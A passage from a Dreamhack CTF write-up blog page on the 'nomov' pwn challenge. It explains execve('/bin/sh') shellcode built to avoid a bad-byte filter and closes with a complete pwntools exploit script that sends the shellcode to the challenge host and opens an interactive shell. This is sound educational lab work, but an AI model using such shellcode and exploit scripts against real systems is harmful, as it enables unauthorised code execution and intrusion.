+</span></span></code></pre></div><p>So, after loading the first value, we can shift it to the left four bytes (that&rsquo;s with the null byte I didn&rsquo;t add in the sequence above). That&rsquo;s 8 * 4 bits, so we move them to the left we can make some space on the right; Then, we can <code>or</code> it with the remaining part of the lower bytes.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>sc <span style="color:#f92672">=</span> asm(<span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">lea rax, [0x0068732f]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">shl rax, 32
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">or rax, 0x6e69622f
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">push rax
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">lea rdi, [rsp]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">xor rsi, rsi
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">xor rdx, rdx
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">lea rax, [0x3b]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">syscall
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>)
+</span></span></code></pre></div><p>Now, it works locally! Let&rsquo;s connect remotely and get the flag!</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/nomov-writeup/flag.png#center"></p>
+<h2 id="the-exploit">The exploit<a hidden class="anchor" aria-hidden="true" href="#the-exploit">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;/home/kali/Downloads/dreamhack/nomov/deploy/main&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span>
+</span></span><span style="display:flex;"><span>cyberedu <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;host8.dreamhack.games:14508&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ip, port <span style="color:#f92672">=</span> cyberedu<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;:&#39;</span>)
+</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> int(port)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>REMOTE:
+</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> remote(ip, port)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>process()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>bad <span style="color:#f92672">=</span> bytearray<span style="color:#f92672">.</span>fromhex(<span style="color:#e6db74">&#39;A1A08E8C8B8A8988B3B2B1B0A5A4A3A2BBBAB9B8B7B6B5B4BFBEBDBCC7C6&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">is_ok</span>(sc):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> b <span style="color:#f92672">in</span> bad:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> b <span style="color:#f92672">in</span> sc:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;bad, found </span><span style="color:#e6db74">{</span>hex(b)<span style="color:#e6db74">}</span><span style="color:#e6db74">!&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>sc <span style="color:#f92672">=</span> asm(<span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">lea rax, [0x0068732f]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">shl rax, 32
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">or rax, 0x6e69622f
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">push rax
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">lea rdi, [rsp]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">xor rsi, rsi
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">xor rdx, rdx
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">lea rax, [0x3b]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">syscall
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>is_ok(sc)
+</span></span><span style="display:flex;"><span>print(sc)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(sc)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><hr>
+<p>As always, the full code can be found on my GitHub
+<strong><a href="https://github.com/irinasusca/ctf-writeups/blob/main/dreamhack/nomov.py">here</a></strong>.</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/dreamhack/">Dreamhack</a></li>
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/pwn/">Pwn</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="https://irinasusca.github.io/writeup-blog/">Irina&#39;s CTF Writeups</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
